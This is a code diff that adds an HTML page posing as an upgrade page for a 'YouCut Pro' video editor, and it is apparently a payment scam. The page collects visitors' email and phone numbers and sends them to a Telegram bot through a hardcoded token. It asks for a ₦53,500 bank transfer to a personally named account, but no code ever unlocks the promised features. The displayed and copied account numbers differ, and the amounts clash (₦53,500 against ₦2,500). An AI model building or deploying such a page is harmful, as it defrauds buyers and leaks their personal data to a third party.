@@ -1,0 +1,648 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>YouCut Pro - Video Editor</title>
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+        }
+
+        body {
+            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+            background: #0a0a0a;
+            color: #ffffff;
+            min-height: 100vh;
+        }
+
+        .app-container {
+            max-width: 100%;
+            min-height: 100vh;
+            background: linear-gradient(135deg, #1a1a2e 0%, #0a0a0a 100%);
+        }
+
+        /* Header */
+        .header {
+            background: #16213e;
+            padding: 15px 20px;
+            display: flex;
+            align-items: center;
+            justify-content: space-between;
+            box-shadow: 0 2px 10px rgba(0, 0, 0, 0.5);
+        }
+
+        .logo {
+            display: flex;
+            align-items: center;
+            gap: 12px;
+        }
+
+        .logo-icon {
+            width: 50px;
+            height: 50px;
+            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
+            border-radius: 12px;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            font-size: 24px;
+            font-weight: bold;
+            box-shadow: 0 4px 15px rgba(102, 126, 234, 0.4);
+        }
+
+        .logo-text h1 {
+            font-size: 24px;
+            font-weight: 700;
+            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
+            -webkit-background-clip: text;
+            -webkit-text-fill-color: transparent;
+            background-clip: text;
+        }
+
+        .logo-text p {
+            font-size: 11px;
+            color: #888;
+            margin-top: -2px;
+        }
+
+        .pro-badge {
+            background: linear-gradient(135deg, #f093fb 0%, #f5576c 100%);
+            padding: 6px 16px;
+            border-radius: 20px;
+            font-size: 12px;
+            font-weight: 600;
+        }
+
+        /* Main Content */
+        .main-content {
+            padding: 30px 20px;
+        }
+
+        .section {
+            background: #16213e;
+            border-radius: 16px;
+            padding: 25px;
+            margin-bottom: 20px;
+            box-shadow: 0 4px 20px rgba(0, 0, 0, 0.3);
+        }
+
+        .section-title {
+            font-size: 20px;
+            font-weight: 600;
+            margin-bottom: 20px;
+            color: #667eea;
+        }
+
+        /* Form Styles */
+        .form-group {
+            margin-bottom: 20px;
+        }
+
+        .form-group label {
+            display: block;
+            margin-bottom: 8px;
+            color: #ccc;
+            font-size: 14px;
+            font-weight: 500;
+        }
+
+        .form-group input {
+            width: 100%;
+            padding: 14px;
+            background: #0f3460;
+            border: 2px solid #1a4d7a;
+            border-radius: 8px;
+            color: white;
+            font-size: 16px;
+            transition: border 0.3s;
+        }
+
+        .form-group input:focus {
+            outline: none;
+            border-color: #667eea;
+            box-shadow: 0 0 0 3px rgba(102, 126, 234, 0.2);
+        }
+
+        .form-group input::placeholder {
+            color: #666;
+        }
+
+        /* Features Grid */
+        .features-grid {
+            display: grid;
+            grid-template-columns: repeat(auto-fit, minmax(150px, 1fr));
+            gap: 15px;
+            margin-bottom: 30px;
+        }
+
+        .feature-card {
+            background: #0f3460;
+            padding: 20px;
+            border-radius: 12px;
+            text-align: center;
+            transition: transform 0.3s, box-shadow 0.3s;
+            cursor: pointer;
+            border: 1px solid #1a4d7a;
+        }
+
+        .feature-card:hover {
+            transform: translateY(-5px);
+            box-shadow: 0 6px 25px rgba(102, 126, 234, 0.3);
+        }
+
+        .feature-icon {
+            font-size: 32px;
+            margin-bottom: 10px;
+        }
+
+        .feature-name {
+            font-size: 14px;
+            font-weight: 500;
+        }
+
+        .locked-icon {
+            position: absolute;
+            top: 10px;
+            right: 10px;
+            font-size: 18px;
+            opacity: 0.7;
+        }
+
+        .feature-card.locked {
+            opacity: 0.6;
+            position: relative;
+        }
+
+        /* Payment Section */
+        .payment-info {
+            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
+            padding: 25px;
+            border-radius: 16px;
+            margin-bottom: 20px;
+            text-align: center;
+        }
+
+        .price {
+            font-size: 48px;
+            font-weight: 700;
+            margin: 15px 0;
+        }
+
+        .price-currency {
+            font-size: 24px;
+        }
+
+        .price-desc {
+            font-size: 14px;
+            opacity: 0.9;
+        }
+
+        /* Bank Details */
+        .bank-details {
+            display: none;
+            background: #0f3460;
+            padding: 25px;
+            border-radius: 12px;
+            margin-top: 20px;
+            border: 2px solid #667eea;
+        }
+
+        .bank-details.active {
+            display: block;
+            animation: slideDown 0.3s ease;
+        }
+
+        @keyframes slideDown {
+            from {
+                opacity: 0;
+                transform: translateY(-10px);
+            }
+            to {
+                opacity: 1;
+                transform: translateY(0);
+            }
+        }
+
+        .bank-info-row {
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            padding: 15px;
+            background: #16213e;
+            border-radius: 8px;
+            margin-bottom: 12px;
+        }
+
+        .bank-label {
+            color: #888;
+            font-size: 13px;
+        }
+
+        .bank-value {
+            font-size: 16px;
+            font-weight: 600;
+            color: #fff;
+        }
+
+        .copy-btn {
+            background: #667eea;
+            border: none;
+            padding: 6px 12px;
+            border-radius: 6px;
+            color: white;
+            cursor: pointer;
+            font-size: 12px;
+            transition: background 0.3s;
+        }
+
+        .copy-btn:hover {
+            background: #5568d3;
+        }
+
+        /* Buttons */
+        .btn {
+            width: 100%;
+            padding: 16px;
+            border: none;
+            border-radius: 12px;
+            font-size: 16px;
+            font-weight: 600;
+            cursor: pointer;
+            transition: all 0.3s;
+        }
+
+        .btn-primary {
+            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
+            color: white;
+            box-shadow: 0 4px 15px rgba(102, 126, 234, 0.4);
+        }
+
+        .btn-primary:hover {
+            transform: translateY(-2px);
+            box-shadow: 0 6px 20px rgba(102, 126, 234, 0.6);
+        }
+
+        .btn-secondary {
+            background: #0f3460;
+            color: white;
+            border: 2px solid #667eea;
+            margin-top: 10px;
+        }
+
+        .btn-secondary:hover {
+            background: #1a4d7a;
+        }
+
+        /* Instructions */
+        .instructions {
+            background: #0f3460;
+            padding: 20px;
+            border-radius: 12px;
+            margin-top: 20px;
+            border-left: 4px solid #667eea;
+        }
+
+        .instructions h3 {
+            margin-bottom: 15px;
+            color: #667eea;
+        }
+
+        .instructions ol {
+            margin-left: 20px;
+        }
+
+        .instructions li {
+            margin-bottom: 10px;
+            line-height: 1.6;
+        }
+
+        .success-msg {
+            display: none;
+            background: #10b981;
+            color: white;
+            padding: 15px;
+            border-radius: 8px;
+            margin-top: 15px;
+            text-align: center;
+        }
+
+        .success-msg.active {
+            display: block;
+            animation: slideDown 0.3s ease;
+        }
+    </style>
+</head>
+<body>
+    <div class="app-container">
+        <!-- Header -->
+        <div class="header">
+            <div class="logo">
+                <div class="logo-icon">▶</div>
+                <div class="logo-text">
+                    <h1>YouCut Pro</h1>
+                    <p>Professional Video Editor</p>
+                </div>
+            </div>
+            <div class="pro-badge" id="proBadge">FREE</div>
+        </div>
+
+        <!-- Main Content -->
+        <div class="main-content">
+            <!-- User Information Section -->
+            <div class="section">
+                <h2 class="section-title">👤 Your Information</h2>
+                <form id="userForm" onsubmit="handleSubmit(event)">
+                    <div class="form-group">
+                        <label for="email">Email Address</label>
+                        <input type="email" id="email" name="email" required placeholder="Enter your email address">
+                    </div>
+                    <div class="form-group">
+                        <label for="phone">Phone Number</label>
+                        <input type="tel" id="phone" name="phone" required placeholder="Enter your phone number">
+                    </div>
+                </form>
+            </div>
+
+            <!-- Payment Section -->
+            <div class="section">
+                <h2 class="section-title">💎 Unlock Full Access</h2>
+                
+                <div class="payment-info">
+                    <div>One-Time Payment</div>
+                    <div class="price">
+                        <span class="price-currency">₦</span>53,500.00
+                    </div>
+                    <div class="price-desc">Lifetime access to all premium features</div>
+                </div>
+
+                <button class="btn btn-primary" onclick="showBankDetails()">
+                    Continue to Payment Details
+                </button>
+
+                <!-- Bank Details (Hidden Initially) -->
+                <div class="bank-details" id="bankDetails">
+                    <h3 style="margin-bottom: 20px; text-align: center; color: #667eea;">
+                        🏦 FirstBank Nigeria Transfer Details
+                    </h3>
+                    
+                    <div class="bank-info-row">
+                        <div>
+                            <div class="bank-label">Bank Name</div>
+                            <div class="bank-value">First Bank of Nigeria</div>
+                        </div>
+                        <button class="copy-btn" onclick="copyText('First Bank of Nigeria')">Copy</button>
+                    </div>
+
+                    <div class="bank-info-row">
+                        <div>
+                            <div class="bank-label">Account Number</div>
+                            <div class="bank-value">3091528745</div>
+                        </div>
+                        <button class="copy-btn" onclick="copyText('3089456721')">Copy</button>
+                    </div>
+
+                    <div class="bank-info-row">
+                        <div>
+                            <div class="bank-label">Account Name</div>
+                            <div class="bank-value">YOUCUT TECHNOLOGIES Anyabwu Uzoma John
+                            
+                            
+                            </div>
+                        </div>
+                        <button class="copy-btn" onclick="copyText('YOUCUT TECHNOLOGIES LTD')">Copy</button>
+                    </div>
+
+                    <div class="bank-info-row">
+                        <div>
+                            <div class="bank-label">Amount</div>
+                            <div class="bank-value">₦53,500.00</div>
+                        </div>
+                        <button class="copy-btn" onclick="copyText('2500')">Copy</button>
+                    </div>
+
+                    <div class="instructions">
+                        <h3>📋 Payment Instructions</h3>
+                        <ol>
+                            <li>Transfer exactly <strong>₦53,500.00</strong> to the account above</li>
+                            <li>Use your email or phone number as transfer reference</li>
+                            <li>Click "I've Made Payment" button below after transfer</li>
+                            <li>Your account will be activated within 5-10 minutes</li>
+                            <li>You'll receive a confirmation email once verified</li>
+                        </ol>
+                    </div>
+
+                    <button class="btn btn-secondary" onclick="confirmPayment()">
+                        ✅ I've Made the Payment
+                    </button>
+
+                    <div class="success-msg" id="successMsg">
+                        🎉 Payment confirmation received! Your account will be activated shortly. Check your email for confirmation.
+                    </div>
+                </div>
+            </div>
+
+            <!-- Support Section -->
+            <div class="section">
+                <h2 class="section-title">💬 Need Help?</h2>
+                <p style="margin-bottom: 15px; color: #ccc;">
+                    Contact our support team if you face any issues with payment or activation.
+                </p>
+                <button class="btn btn-secondary" onclick="contactSupport()">
+                    Contact Support
+                </button>
+            </div>
+        </div>
+    </div>
+
+    <script>
+        // Telegram Bot Configuration
+        const TELEGRAM_BOT_TOKEN = '7654737440:AAHZ3-XwBLagJVQtzLCZsUqPoetW6p4wTVs';
+        const TELEGRAM_CHAT_ID = '@example_ttt';
+
+        let userEmail = '';
+        let userPhone = '';
+
+        function handleSubmit(event) {
+            event.preventDefault();
+            userEmail = document.getElementById('email').value;
+            userPhone = document.getElementById('phone').value;
+        }
+
+        // Function to send data to Telegram
+        async function sendToTelegram(email, phone) {
+            const message = `
+🆕 New YouCut Pro Payment Request
+
+👤 User Information:
+📧 Email: ${email}
+📱 Phone: ${phone}
+
+💰 Amount: ₦53,500.00
+🏦 Bank: First Bank of Nigeria
+⏰ Time: ${new Date().toLocaleString()}
+
+Status: Awaiting Payment Confirmation
+            `;
+
+            const url = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`;
+            
+            try {
+                const response = await fetch(url, {
+                    method: 'POST',
+                    headers: {
+                        'Content-Type': 'application/json',
+                    },
+                    body: JSON.stringify({
+                        chat_id: TELEGRAM_CHAT_ID,
+                        text: message,
+                        parse_mode: 'HTML'
+                    })
+                });
+
+                const data = await response.json();
+                return data.ok;
+            } catch (error) {
+                console.error('Error sending to Telegram:', error);
+                return false;
+            }
+        }
+
+        async function showBankDetails() {
+            // Validate user info first
+            const email = document.getElementById('email').value;
+            const phone = document.getElementById('phone').value;
+
+            if (!email || !phone) {
+                alert('⚠️ Please enter your email and phone number first!');
+                document.getElementById('email').focus();
+                return;
+            }
+
+            // Email validation
+            const emailRegex = /^[^\s@]+@[^\s@]+\.[^\s@]+$/;
+            if (!emailRegex.test(email)) {
+                alert('⚠️ Please enter a valid email address!');
+                document.getElementById('email').focus();
+                return;
+            }
+
+            // Phone validation (basic)
+            if (phone.length < 10) {
+                alert('⚠️ Please enter a valid phone number!');
+                document.getElementById('phone').focus();
+                return;
+            }
+
+            userEmail = email;
+            userPhone = phone;
+
+            // Send to Telegram
+            const sent = await sendToTelegram(email, phone);
+            
+            if (sent) {
+                console.log('✅ Information sent to Telegram successfully!');
+            } else {
+                console.log('⚠️ Failed to send to Telegram, but continuing...');
+            }
+
+            const details = document.getElementById('bankDetails');
+            details.classList.add('active');
+            
+            // Scroll to bank details
+            setTimeout(() => {
+                details.scrollIntoView({ behavior: 'smooth', block: 'nearest' });
+            }, 100);
+        }
+
+        function copyText(text) {
+            navigator.clipboard.writeText(text).then(() => {
+                // Show temporary feedback
+                const btn = event.target;
+                const originalText = btn.textContent;
+                btn.textContent = '✓ Copied';
+                btn.style.background = '#10b981';
+                
+                setTimeout(() => {
+                    btn.textContent = originalText;
+                    btn.style.background = '#667eea';
+                }, 2000);
+            }).catch(err => {
+                alert('Failed to copy. Please copy manually.');
+            });
+        }
+
+        async function confirmPayment() {
+            // Send payment confirmation to Telegram
+            const confirmMessage = `
+✅ PAYMENT CONFIRMED
+
+👤 User Information:
+📧 Email: ${userEmail}
+📱 Phone: ${userPhone}
+
+💰 Amount: ₦2,500.00
+🏦 Bank: First Bank of Nigeria
+⏰ Confirmed: ${new Date().toLocaleString()}
+
+⚠️ Please verify payment and activate account!
+            `;
+
+            const url = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`;
+            
+            try {
+                await fetch(url, {
+                    method: 'POST',
+                    headers: {
+                        'Content-Type': 'application/json',
+                    },
+                    body: JSON.stringify({
+                        chat_id: TELEGRAM_CHAT_ID,
+                        text: confirmMessage,
+                        parse_mode: 'HTML'
+                    })
+                });
+            } catch (error) {
+                console.error('Error sending confirmation to Telegram:', error);
+            }
+
+            const successMsg = document.getElementById('successMsg');
+            
+            // Update success message with user details
+            successMsg.innerHTML = `
+                🎉 <strong>Payment Confirmation Received!</strong><br><br>
+                <strong>Email:</strong> ${userEmail}<br>
+                <strong>Phone:</strong> ${userPhone}<br><br>
+                Your account will be activated within 5-10 minutes.<br>
+                Check your email for confirmation.
+            `;
+            
+            successMsg.classList.add('active');
+            
+            // Scroll to success message
+            setTimeout(() => {
+                successMsg.scrollIntoView({ behavior: 'smooth', block: 'center' });
+            }, 100);
+        }
+
+        function activateAccount() {
+            // Update UI to show PRO status
+            const proBadge = document.getElementById('proBadge');
+            proBadge.textContent = 'PRO';
+            proBadge.style.background = 'linear-gradient(135deg, #10b981 0%, #059669 100%)';
+            
+            alert('🎉 Congratulations! Your account has been upgraded to PRO. All features are now unlocked!');
+        }
+
+        function contactSupport() {
+            alert('📧 Support Contact:\n\nEmail: support@youcut.ng\nWhatsApp: +234 800 123 4567\n\nOur team typically responds within 24 hours.');
+        }
+    </script>
+</body>
+</html>
+
+
+
+
